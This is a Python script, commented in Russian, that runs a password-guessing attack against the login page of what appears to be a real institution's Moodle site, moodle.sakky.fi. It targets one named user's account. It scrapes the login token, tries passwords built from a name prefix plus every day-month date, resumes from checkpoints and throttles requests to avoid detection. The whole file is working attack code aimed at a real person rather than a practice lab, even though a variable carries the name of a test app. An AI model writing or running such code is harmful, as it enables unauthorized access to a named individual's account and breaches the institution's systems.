import requests
from bs4 import BeautifulSoup
import time
import os

# --- КОНФИГУРАЦИЯ ---
DVWA_URL = "https://moodle.sakky.fi"
LOGIN_PAGE = f"{DVWA_URL}/login/index.php"

ATTACK_USERNAME = "andrii.hutsaliuk"
PASS_BASE = "HutAnd"

# Rate limit: через сколько попыток делать паузу и длина паузы в секундах
RATE_LIMIT_COUNT = 1   # делать паузу после каждых N попыток
RATE_LIMIT_PAUSE = 10   # пауза N секунд

# Резюма / контроль точки (checkpoint)
# Если хочешь начать с конкретной даты (DDMM), укажи её:
START_DDMM = "1511"        # пример: "0407" — соответствует PerJaa0407
RESUME_AFTER = True        # True -> начать с ПОСЛЕДУЮЩЕЙ комбинации после START_DDMM
                           # False -> начать с самой START_DDMM
USE_CHECKPOINT_FILE = False # если True — читаем/пишем checkpoint.txt
CHECKPOINT_FILE = "checkpoint.txt"

# Поведение при неправильном START_DDMM
STRICT_START = False       # если True — если START_DDMM не найден, скрипт завершится с ошибкой
# ---------------------

def generate_passwords(base):
    days_in_month = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    for month in range(1, 13):
        for day in range(1, days_in_month[month-1] + 1):
            yield f"{base}{day:02d}{month:02d}"

def load_checkpoint():
    """Вернёт DDMM из checkpoint-файла или None, если файла нет."""
    if not USE_CHECKPOINT_FILE:
        return None
    if not os.path.exists(CHECKPOINT_FILE):
        return None
    try:
        with open(CHECKPOINT_FILE, 'r') as f:
            val = f.read().strip()
            if val:
                return val
    except Exception:
        pass
    return None

def save_checkpoint(ddmm):
    """Записать последний обработанный DDMM в файл."""
    if not USE_CHECKPOINT_FILE:
        return
    try:
        with open(CHECKPOINT_FILE, 'w') as f:
            f.write(ddmm)
    except Exception as e:
        print(f"[⚠️] Не удалось записать checkpoint: {e}")

def get_session_and_token(session):
    print(f"[⚙️] Получение страницы входа и токенов...")
    try:
        response = session.get(LOGIN_PAGE)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        login_token_input = soup.find('input', {'name': 'logintoken'})

        if login_token_input:
            login_token = login_token_input['value']
            print(f"[✅] Извлечен logintoken: {login_token[:10]}...")
            return login_token
        else:
            print(f"[❌] Токен (logintoken) не найден. Проверьте URL и форму.")
            return None

    except requests.exceptions.RequestException as e:
        print(f"[❌] Ошибка при получении страницы: {e}")
        return None

def attempt_login(session, username, password, token):
    login_data = {
        'logintoken': token,
        'anchor': '',
        'username': username,
        'password': password,
        'Log in': 'submit'
    }

    print(f"[🔑] Попытка входа: Логин='{username}', Пароль='{password}'")
    try:
        response = session.post(LOGIN_PAGE, data=login_data, allow_redirects=True, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"[⚠️] Ошибка запроса: {e}")
        return False

    if response.status_code == 200:
        if response.url.endswith("/my/"):
            print(f"[🟢] Успех! Правильный пароль: {password}")
            return True
        elif "Invalid login, please try again" in response.text or "логин или пароль" in response.text:
            print(f"[🔴] Неудачно. Неправильные учетные данные.")
            return False
        else:
            print(f"[🟡] Ответ получен, но результат неясен.")
            return False
    else:
        print(f"[❌] HTTP ошибка при отправке данных: {response.status_code}")
        return False

def main():
    # Сгенерируем список паролей
    passwords = list(generate_passwords(PASS_BASE))
    total = len(passwords)
    if not passwords:
        print("[❌] Сгенерировано 0 паролей. Проверьте PASS_BASE.")
        return

    # Определим DDMM, с которого начать:
    start_from = None

# 1) Если есть checkpoint и разрешено — используем его как приоритет
    ck = load_checkpoint()
    if ck:
        print(f"[ℹ️] Загружен checkpoint: {ck} — начнём с этого места.")
        start_from = ck
        # если resume_after True, мы начнём со следующего после checkpoint
        resume_after_for_checkpoint = True
    else:
        # 2) Иначе используем START_DDMM если он задан
        if START_DDMM:
            start_from = START_DDMM
            resume_after_for_checkpoint = RESUME_AFTER

    # Найдём индекс начала в списке passwords
    start_idx = 0  # по умолчанию с начала
    if start_from:
        target = f"{PASS_BASE}{start_from}"
        try:
            pos = passwords.index(target)
            start_idx = pos + (1 if resume_after_for_checkpoint else 0)
            if start_idx >= total:
                print(f"[⚠️] Позиция старта ({target}) — последняя комбинация или дальше. Нечего перебирать.")
                return
            print(f"[ℹ️] Начнём с индекса {start_idx+1} (пароль {passwords[start_idx]}).")
        except ValueError:
            msg = f"[❌] Заданная стартовая комбинация {target} не найдена в генерации."
            if STRICT_START:
                print(msg + " Завершение, т.к. STRICT_START=True.")
                return
            else:
                print(msg + " Продолжаем с начала списка.")
                start_idx = 0

    # Основной цикл — начинаем с start_idx
    with requests.Session() as session:
        tries = 0
        for idx in range(start_idx, total):
            password = passwords[idx]
            print("\n" + "="*50)

            token = get_session_and_token(session)
            if token is None:
                print(f"[⚠️] Не удалось получить токен. Прекращение работы.")
                break

            # Попытка входа
            ok = attempt_login(session, ATTACK_USERNAME, password, token)

            # Сохраняем checkpoint как DDMM последней ПРОВЕРЕННОЙ комбинации
            # извлекаем суффикс DDMM из password (последние 4 символа)
            ddmm = password[-4:]
            save_checkpoint(ddmm)

            if ok:
                print("="*50)
                print(f"[🎉] Пароль найден! Работа скрипта завершена.")
                return

            tries += 1

            # Rate-limit: пауза после каждой RATE_LIMIT_COUNT попыток (если нужно)
            # здесь idx+1 — реальный номер попытки в общем списке
            if RATE_LIMIT_COUNT > 0 and ((idx + 1) % RATE_LIMIT_COUNT == 0) and ((idx + 1) != total):
                print(f"[⏸️] Выполнено {idx + 1} попыток — пауза {RATE_LIMIT_PAUSE} сек...")
                time.sleep(RATE_LIMIT_PAUSE)

        print("="*50)
        print(f"[🏁] Тест завершен. Пароль для '{ATTACK_USERNAME}' не найден среди перебранных вариантов.")

if __name__ == "__main__":
    main()
